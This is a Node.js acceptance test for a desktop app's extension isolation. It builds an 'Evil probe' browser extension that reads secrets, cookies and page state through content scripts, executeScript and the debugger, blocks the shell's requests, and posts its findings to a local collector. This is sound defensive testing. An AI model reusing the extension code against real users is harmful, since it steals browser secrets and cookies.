// Acceptance test of the isolation, through the PRODUCT install path.
//
// An "evil" extension asks for everything (<all_urls>, tabs, scripting, debugger,
// declarativeNetRequest, cookies, a content script on every page) and reports what it can
// reach to a local collector. It is installed with the real `extension_package_manage`
// command (package check, isolated load check, folder, registration), in two runs:
//
//   control   the harness switch lets it start in the shared profile with the shell in it
//             (single environment). The evil extension MUST reach the shell. Without this
//             a clean result below would prove nothing.
//   product   no escape. The install must end as "ready, waiting" (nothing runs); the
//             switch (gate, restart, hydration check) makes the split final; only then the
//             extension is registered, in the browsing profile. It must reach the tabs and
//             must NOT reach the shell through any channel.
//
//   node scripts/evil-extension-acceptance.mjs <app.exe> <identifier>
//
// <app.exe> must be a build with the `split-driver` feature (the fixture package hook and the
// control escape exist only there) and its own identity (tauri.perf.conf.json): the
// identity's data folders are reset before each run.
import { spawn, spawnSync } from 'node:child_process'
import { createHash } from 'node:crypto'
import { closeSync, existsSync, mkdirSync, openSync, readdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { createServer } from 'node:http'
import { join } from 'node:path'
import { setTimeout as sleep } from 'node:timers/promises'
import { Cdp } from './e2e-cdp.mjs'

const [exe, identifier] = process.argv.slice(2).filter((a) => !a.startsWith('--'))
const only = (process.argv.find((a) => a.startsWith('--only=')) ?? '').slice(7)
if (!exe || !identifier) {
  console.error('usage: node scripts/evil-extension-acceptance.mjs <app.exe> <identifier>')
  process.exit(2)
}
const local = join(process.env.LOCALAPPDATA, identifier)
const roaming = join(process.env.APPDATA, identifier)
const scratch = join(process.env.TEMP, 'nebula-evil-acceptance')
const ID = 'nebula-evil-fixture'
const SECRET = 'secret-' + Math.random().toString(36).slice(2)
const results = []
const check = (name, ok, detail = '') => {
  results.push({ name, ok: Boolean(ok) })
  console.log(`${ok ? 'PASS' : 'FAIL'} ${name}${detail ? `  (${detail})` : ''}`)
}
const powershell = (script) => spawnSync('powershell', ['-NoProfile', '-Command', script], { encoding: 'utf8', maxBuffer: 64 * 1024 * 1024 })

function killAll() {
  const escaped = exe.split('/').join(String.fromCharCode(92)).replace(/'/g, "''")
  powershell(`
    Get-CimInstance Win32_Process | Where-Object { $_.ExecutablePath -eq '${escaped}' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
    Get-CimInstance Win32_Process -Filter "Name='msedgewebview2.exe'" | Where-Object { $_.CommandLine -like '*${identifier}*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
  `)
}
async function resetFixture() {
  killAll()
  for (let i = 0; i < 20; i += 1) {
    rmSync(local, { recursive: true, force: true })
    rmSync(roaming, { recursive: true, force: true })
    if (!existsSync(local)) return
    await sleep(1000)
  }
  throw new Error('could not reset the fixture identity')
}

// ---- the evil extension and its collector --------------------------------------------------------
const reports = []
let collectorBase = ''
const server = createServer((request, response) => {
  if (request.method === 'POST' && request.url === '/report') {
    const chunks = []
    request.on('data', (chunk) => chunks.push(chunk))
    request.on('end', () => {
      try {
        reports.push({ at: Date.now(), ...JSON.parse(Buffer.concat(chunks).toString('utf8')) })
      } catch {
        // not a report
      }
      response.setHeader('access-control-allow-origin', '*')
      response.end('ok')
    })
    return
  }
  if (request.method === 'OPTIONS') {
    response.writeHead(204, { 'access-control-allow-origin': '*', 'access-control-allow-headers': '*' })
    response.end()
    return
  }
  response.setHeader('content-type', 'text/html')
  response.end('<!doctype html><title>Tab page</title><body>tab page</body>')
})
await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve))
collectorBase = `http://127.0.0.1:${server.address().port}`

const manifest = {
  manifest_version: 3,
  name: 'Evil probe',
  version: '1.0.0',
  permissions: ['tabs', 'scripting', 'debugger', 'declarativeNetRequest', 'declarativeNetRequestWithHostAccess', 'cookies', 'storage', 'webNavigation'],
  host_permissions: ['<all_urls>'],
  background: { service_worker: 'sw.js' },
  content_scripts: [{ matches: ['<all_urls>'], js: ['content.js'], run_at: 'document_idle' }],
}
const content = `
chrome.runtime.sendMessage({
  kind: 'content',
  info: { where: location.href, secret: localStorage.getItem('nebula-evil-secret'), cookie: document.cookie, title: document.title },
});
`
const worker = `
const BASE = ${JSON.stringify(collectorBase)};
const post = (kind, data) => fetch(BASE + '/report', { method: 'POST', body: JSON.stringify({ kind, data }) }).catch(() => {});
chrome.runtime.onMessage.addListener((m) => { if (m && m.kind === 'content') post('content', m.info); });
const SHELL_READ = () => ({ u: location.href, s: localStorage.getItem('nebula-evil-secret'), c: document.cookie });
async function probe(round) {
  const out = { round, tabs: [], exec: [], dbg: [] };
  try { out.tabs = (await chrome.tabs.query({})).map((t) => ({ id: t.id, url: t.url })); } catch (e) { out.tabsError = String(e).slice(0, 160); }
  for (const t of out.tabs) {
    try {
      const r = await chrome.scripting.executeScript({ target: { tabId: t.id }, world: 'MAIN', func: SHELL_READ });
      out.exec.push({ tab: t.url, r: r[0] && r[0].result });
    } catch (e) { out.exec.push({ tab: t.url, error: String(e).slice(0, 160) }); }
    try {
      await chrome.debugger.attach({ tabId: t.id }, '1.3');
      const r = await chrome.debugger.sendCommand({ tabId: t.id }, 'Runtime.evaluate', { expression: 'location.href + " | " + localStorage.getItem("nebula-evil-secret")' });
      out.dbg.push({ tab: t.url, r: r && r.result && r.result.value });
      await chrome.debugger.detach({ tabId: t.id });
    } catch (e) { out.dbg.push({ tab: t.url, error: String(e).slice(0, 160) }); }
  }
  try {
    await chrome.declarativeNetRequest.updateDynamicRules({
      removeRuleIds: [1],
      addRules: [{ id: 1, priority: 1, action: { type: 'block' }, condition: { urlFilter: '||tauri.localhost/__nebula_probe', resourceTypes: ['xmlhttprequest', 'other'] } }],
    });
    out.dnr = 'rules-added';
  } catch (e) { out.dnr = String(e).slice(0, 160); }
  try { out.cookies = (await chrome.cookies.getAll({ domain: 'tauri.localhost' })).map((c) => c.name); } catch (e) { out.cookiesError = String(e).slice(0, 100); }
  await post('probe', out);
}
post('alive', { at: Date.now() });
for (let i = 1; i <= 8; i += 1) setTimeout(() => probe(i), i * 6000);
`
function buildPackage() {
  const dir = join(scratch, 'package')
  rmSync(scratch, { recursive: true, force: true })
  mkdirSync(dir, { recursive: true })
  writeFileSync(join(dir, 'manifest.json'), JSON.stringify(manifest, null, 2))
  writeFileSync(join(dir, 'sw.js'), worker)
  writeFileSync(join(dir, 'content.js'), content)
  const zip = join(scratch, 'evil.zip')
  const run = powershell(`Compress-Archive -Path '${join(dir, '*').replace(/'/g, "''")}' -DestinationPath '${zip.replace(/'/g, "''")}' -Force`)
  if (run.status !== 0) throw new Error(run.stderr)
  const bytes = readFileSync(zip)
  const sha256 = createHash('sha256').update(bytes).digest('hex')
  const registry = join(scratch, 'fixture-packages.json')
  writeFileSync(
    registry,
    JSON.stringify([
      {
        id: ID,
        display: { name: 'Evil probe', description: 'Acceptance fixture', category: 'privacy' },
        version: '1.0.0',
        downloadName: ID,
        url: 'https://fixture.invalid/evil.zip',
        sha256,
        manifestNameField: 'name',
        manifestName: 'Evil probe',
        access: ['<all_urls>'],
        redirectHosts: ['fixture.invalid'],
      },
    ]),
  )
  return { bytes, sha256, registry }
}

// ---- driving the app -------------------------------------------------------------------------------
const environments = [join(local, 'EBWebView'), join(local, 'trusted', 'EBWebView')]
async function targets() {
  const all = []
  for (const folder of environments) {
    const file = join(folder, 'DevToolsActivePort')
    if (!existsSync(file)) continue
    const port = Number.parseInt(readFileSync(file, 'utf8'), 10)
    try {
      for (const target of await (await fetch(`http://127.0.0.1:${port}/json/list`)).json()) all.push(target)
    } catch {
      // stale
    }
  }
  return all
}
const open = []
function dropConnections() {
  for (const cdp of open.splice(0)) {
    try { cdp.ws.close() } catch { /* gone */ }
  }
}
async function evaluate(cdp, expression) {
  const result = await cdp.call('Runtime.evaluate', { expression, awaitPromise: true, returnByValue: true })
  if (result.exceptionDetails) throw new Error(`${result.exceptionDetails.text} ${result.exceptionDetails.exception?.description ?? result.exceptionDetails.exception?.value ?? ''}`)
  return result.result.value
}
async function mainPage(timeoutMs = 45_000) {
  const deadline = Date.now() + timeoutMs
  while (Date.now() < deadline) {
    for (const target of (await targets()).filter((t) => t.type === 'page' && t.url.startsWith('http://tauri.localhost'))) {
      try {
        const cdp = new Cdp(target.webSocketDebuggerUrl, { callTimeoutMs: 60_000 })
        await cdp.open()
        open.push(cdp)
        if ((await evaluate(cdp, `window.__TAURI_INTERNALS__?.metadata?.currentWebview?.label ?? null`)) === 'main') return cdp
        cdp.ws.close()
      } catch {
        // going away
      }
    }
    await sleep(500)
  }
  throw new Error('no main page')
}
async function afterRestart(predicate) {
  dropConnections()
  const deadline = Date.now() + 90_000
  while (Date.now() < deadline) {
    try {
      const main = await mainPage(8_000)
      const state = await evaluate(main, "window.__TAURI_INTERNALS__.invoke('shell_isolation_status')")
      if (predicate(state)) return main
    } catch {
      // between processes
    }
    dropConnections()
    await sleep(700)
  }
  throw new Error('the restarted app did not reach the expected state')
}
// The app's own log lines (stderr) are kept: when a step fails they say why.
function launch(extraEnv) {
  mkdirSync(scratch, { recursive: true })
  const log = openSync(join(scratch, 'app.log'), 'a')
  const child = spawn(exe, [], {
    env: { ...process.env, ...extraEnv, WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS: '--remote-debugging-port=0' },
    stdio: ['ignore', log, log],
  })
  closeSync(log)
  return child
}
const manage = (main, action, extra = {}) =>
  evaluate(main, `window.__TAURI_INTERNALS__.invoke('extension_package_manage', ${JSON.stringify({ id: ID, action, ...extra })}).then((v) => v, (e) => ({ error: String(e) }))`)

async function seedShell(main) {
  await evaluate(main, `(() => {
    localStorage.setItem('nebula-evil-secret', ${JSON.stringify(SECRET)})
    window.__NEBULA_TRUSTED_SHELL__ = ${JSON.stringify(SECRET)}
    document.cookie = 'nebula_evil_cookie=' + ${JSON.stringify(SECRET)} + '; path=/; max-age=3600'
    return 1
  })()`)
}

async function openTab(main) {
  await evaluate(main, `window.__TAURI_INTERNALS__.invoke('plugin:webview|create_webview', { windowLabel: 'main', options: { label: 'nebula-tab-evil', url: ${JSON.stringify(collectorBase + '/tab')}, x: 0, y: 0, width: 300, height: 300, browserExtensionsEnabled: true } }).then(() => 1)`)
}

/** What the evil extension reached, derived from its reports. */
function analyse() {
  const probes = reports.filter((r) => r.kind === 'probe').map((r) => r.data)
  const contents = reports.filter((r) => r.kind === 'content').map((r) => r.data)
  const isShell = (url) => typeof url === 'string' && url.includes('tauri.localhost')
  const isTab = (url) => typeof url === 'string' && url.startsWith(collectorBase)
  const out = {
    alive: reports.some((r) => r.kind === 'alive'),
    probes: probes.length,
    contentOnShell: contents.some((c) => isShell(c.where)),
    contentReadsSecret: contents.some((c) => isShell(c.where) && c.secret === SECRET),
    contentOnTab: contents.some((c) => isTab(c.where)),
    tabsSeeShell: false,
    tabsSeeTab: false,
    execReadsShell: false,
    execReadsTab: false,
    debuggerReadsShell: false,
    debuggerReadsTab: false,
    cookiesSeen: false,
    dnrRulesAdded: false,
  }
  for (const probe of probes) {
    for (const tab of probe.tabs ?? []) {
      out.tabsSeeShell ||= isShell(tab.url)
      out.tabsSeeTab ||= isTab(tab.url)
    }
    for (const e of probe.exec ?? []) {
      out.execReadsShell ||= isShell(e.tab) && e.r?.s === SECRET
      out.execReadsTab ||= isTab(e.tab) && !!e.r
    }
    for (const d of probe.dbg ?? []) {
      out.debuggerReadsShell ||= isShell(d.tab) && String(d.r ?? '').includes(SECRET)
      out.debuggerReadsTab ||= isTab(d.tab) && String(d.r ?? '').includes(collectorBase)
    }
    out.cookiesSeen ||= (probe.cookies ?? []).includes('nebula_evil_cookie')
    out.dnrRulesAdded ||= probe.dnr === 'rules-added'
  }
  return out
}

async function shellRequestBlocked(main) {
  return evaluate(main, `fetch('/__nebula_probe.txt').then((r) => 'status:' + r.status, (e) => 'blocked:' + e)`)
}

const { bytes, registry, sha256 } = buildPackage()
const fixtureEnv = { NEBULA_FIXTURE_PACKAGES: registry }
function placePackage() {
  const root = join(local, 'extensions', ID)
  mkdirSync(root, { recursive: true })
  writeFileSync(join(root, 'package.zip'), bytes)
  return root
}

let main
let result
try {
  // ======================= control ==========================================================
  if (only !== 'product') {
  console.log('--- control: the evil extension in the shared profile, shell included')
  await resetFixture()
  reports.length = 0
  launch({ ...fixtureEnv, NEBULA_FIXTURE_ALLOW_SHARED_PROFILE: '1' })
  main = await mainPage()
  await sleep(4000)
  await seedShell(main)
  placePackage()
  result = await manage(main, 'install', { expectedSha256: sha256 })
  check('control: the install registers the extension (escape on)', result?.installed && result?.enabled && !result?.pendingActivation, JSON.stringify(result))
  // Pages that load after the registration get the content script: reload the shell.
  await sleep(2000)
  await evaluate(main, 'location.reload()').catch(() => undefined)
  dropConnections()
  main = await mainPage()
  await seedShell(main)
  await sleep(45_000)
  const control = analyse()
  console.log('INFO control analysis:', JSON.stringify(control))
  check('control: the extension ran and reported', control.alive && control.probes > 0)
  check('control: it REACHES the shell (so a clean result below means something)', control.tabsSeeShell && control.execReadsShell && control.debuggerReadsShell && control.contentReadsSecret, JSON.stringify(control))
  const controlBlocked = await shellRequestBlocked(main)
  check('control: it blocks the shell\'s own requests', control.dnrRulesAdded && /^blocked/.test(controlBlocked), controlBlocked)
  dropConnections()
  killAll()
  await sleep(2500)
  }

  // ======================= product ==========================================================
  console.log('--- product: install, switch, activate')
  await resetFixture()
  reports.length = 0
  launch(fixtureEnv)
  main = await mainPage()
  await sleep(4000)
  await seedShell(main)
  const root = placePackage()
  // Diagnostics: what the extension's folder holds over time (when the records appear and go).
  let lastListing = ''
  const watcher = setInterval(() => {
    try {
      const listing = readdirSync(root).sort().join(',')
      if (listing !== lastListing) {
        lastListing = listing
        console.log('INFO extension folder:', new Date().toISOString().slice(11, 23), listing)
      }
    } catch { /* not there */ }
  }, 300)
  result = await manage(main, 'install', { expectedSha256: sha256 })
  check('product: the install is refused to start and reported as waiting', result?.pendingActivation === true && !result?.installed && !result?.enabled, JSON.stringify(result))
  check('product: the package was prepared (folder recorded) but nothing is registered', existsSync(join(root, 'pending-activation')) && !existsSync(join(root, 'installed-id')))
  const direct = await evaluate(main, `window.__TAURI_INTERNALS__.invoke('extension_package_manage', ${JSON.stringify({ id: ID, action: 'enable' })}).then((v) => v, (e) => ({ error: String(e) }))`)
  check('product: enabling it is not a way around the wait', direct?.pendingActivation === true && !direct?.enabled, JSON.stringify(direct))
  await sleep(20_000)
  // The isolated load check may run it once in a temporary profile of its own (that is the
  // validation); it must not have run in the shared profile, where the shell is.
  const before = analyse()
  check('product: no extension code ran in the shared profile before the split', !before.contentOnShell && !before.tabsSeeShell && !before.execReadsShell && !before.debuggerReadsShell && !before.contentOnTab, JSON.stringify(before))
  const status = await manage(main, 'status')
  check('product: the catalog status says waiting', status?.pendingActivation === true, JSON.stringify(status))

  const switched = await evaluate(main, `window.__TAURI_INTERNALS__.invoke('shell_isolation_switch', { target: 'split' }).then(() => 'ok', (e) => 'failed: ' + JSON.stringify(e))`)
  check('product: the migration gate passes', switched === 'ok', switched)
  main = await afterRestart((s) => s.mode === 'split' && !s.hydrating && s.pending === null)
  check('product: the split is final (hydration digest verified)', true)
  // Activation follows the commit (2 s later). Open a tab for the extension to find.
  await sleep(3000)
  await seedShell(main)
  await openTab(main)
  let active = null
  for (let i = 0; i < 30 && !active?.enabled; i += 1) {
    await sleep(2000)
    active = await manage(main, 'status')
  }
  check('product: the extension is registered and enabled after the split is final', active?.installed && active?.enabled && !active?.pendingActivation, JSON.stringify(active))
  check('product: the browsing profile marker is set', existsSync(join(root, 'installed-profile')))
  check('product: the pending record is cleared', !existsSync(join(root, 'pending-activation')))
  await sleep(50_000)
  const product = analyse()
  console.log('INFO product analysis:', JSON.stringify(product))
  check('product: the extension ran and reported', product.alive && product.probes > 0)
  check('product: it works where it should (the tab)', product.contentOnTab && product.tabsSeeTab && product.execReadsTab && product.debuggerReadsTab, JSON.stringify(product))
  check('product: no content script ran on the shell', !product.contentOnShell)
  check('product: tabs.query does not list the shell', !product.tabsSeeShell)
  check('product: executeScript (MAIN world) cannot read the shell', !product.execReadsShell)
  check('product: the debugger cannot read the shell', !product.debuggerReadsShell)
  check('product: it cannot read the shell\'s cookies', !product.cookiesSeen)
  const productBlocked = await shellRequestBlocked(main)
  check('product: it cannot block the shell\'s requests (declarativeNetRequest)', product.dnrRulesAdded && /^status/.test(productBlocked), productBlocked)
  const secretInShell = await evaluate(main, `localStorage.getItem('nebula-evil-secret')`)
  check('product: the shell still holds its state (hydrated)', secretInShell === SECRET)
} catch (error) {
  check('the acceptance run completed', false, String(error?.stack ?? error))
} finally {
  dropConnections()
  killAll()
  server.close()
  process.exitCode ??= 0
}
const failed = results.filter((r) => !r.ok)
console.log(failed.length === 0 ? '\nALL CHECKS PASSED' : `\n${failed.length} CHECK(S) FAILED`)
process.exit(failed.length === 0 ? 0 : 1)
